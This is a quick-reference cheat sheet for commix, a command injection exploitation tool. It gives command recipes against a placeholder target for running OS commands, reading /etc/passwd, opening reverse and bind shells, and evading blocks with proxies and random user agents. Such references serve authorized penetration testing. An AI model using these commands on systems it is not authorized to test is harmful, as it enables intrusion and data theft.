# commix

> Automated command injection exploitation tool.

## Quickstart

```bash
# Test URL parameter
commix -u "https://target.com/page?cmd=whoami"

# Test POST
commix -u "https://target.com/exec" --data="cmd=test"

# With cookie
commix -u "https://target.com/page?cmd=test" --cookie="session=abc"
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| Command injection | OS command execution |
| Techniques | Classic, eval-based, time-based |
| Shells | Reverse/bind shell |

## Syntax

```text
commix -u <url> [options]
commix -r <request.txt> [options]
```

## Options

### Target

| Option | Description |
|--------|-------------|
| `-u <url>` | Target URL |
| `-r <file>` | Request file |
| `--data <d>` | POST data |
| `-p <param>` | Test parameter |
| `--cookie <c>` | Cookie |
| `-H <header>` | Header |

### Detection

| Option | Description |
|--------|-------------|
| `--level <1-3>` | Test level |
| `--technique <t>` | Technique (c,e,t) |
| `--os <os>` | Target OS |
| `--skip-empty` | Skip empty params |

### Exploitation

| Option | Description |
|--------|-------------|
| `--os-cmd <cmd>` | Execute command |
| `--reverse-shell` | Reverse shell |
| `--bind-shell` | Bind shell |
| `--file-read <f>` | Read file |
| `--file-write` | Write file |

### Request

| Option | Description |
|--------|-------------|
| `--proxy <url>` | Proxy |
| `--random-agent` | Random UA |
| `--timeout <sec>` | Timeout |

### Output

| Option | Description |
|--------|-------------|
| `-v` | Verbose |
| `--batch` | Non-interactive |
| `-o <file>` | Output file |

## Recipes

### Basic Testing

```bash
# Test GET parameter
commix -u "https://target.com/ping?ip=127.0.0.1"

# Test specific parameter
commix -u "https://target.com/page?a=1&b=2" -p b

# Test POST
commix -u "https://target.com/exec" --data="cmd=whoami"
```

### From Request File

```bash
# Save from Burp, test
commix -r request.txt

# Specific parameter
commix -r request.txt -p cmd
```

### Shell Access

```bash
# Interactive shell
commix -u "https://target.com/page?cmd=test" --os-cmd

# Reverse shell
commix -u "https://target.com/page?cmd=test" --reverse-shell

# Bind shell
commix -u "https://target.com/page?cmd=test" --bind-shell
```

### Execute Commands

```bash
# Run specific command
commix -u "https://target.com/page?cmd=test" --os-cmd="id"

# Read file
commix -u "https://target.com/page?cmd=test" --file-read="/etc/passwd"
```

### Techniques

```bash
# Classic only
commix -u "https://target.com/page?cmd=test" --technique=c

# Time-based
commix -u "https://target.com/page?cmd=test" --technique=t

# All techniques
commix -u "https://target.com/page?cmd=test" --technique=cet
```

### With Authentication

```bash
# Cookie auth
commix -u "https://target.com/page?cmd=test" --cookie="session=abc123"

# Header auth
commix -u "https://target.com/page?cmd=test" -H "Authorization: Bearer token"
```

### Through Proxy

```bash
# Burp proxy
commix -u "https://target.com/page?cmd=test" --proxy="http://127.0.0.1:8080"
```

## Output & Parsing

```bash
# Output file
commix -u "https://target.com/page?cmd=test" -o results.txt

# Non-interactive
commix -u "https://target.com/page?cmd=test" --batch
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No injection | Try all techniques, increase level |
| Blind injection | Use time-based technique |
| Blocked | Use proxy, change UA |

## References

- [commix GitHub](https://github.com/commixproject/commix)
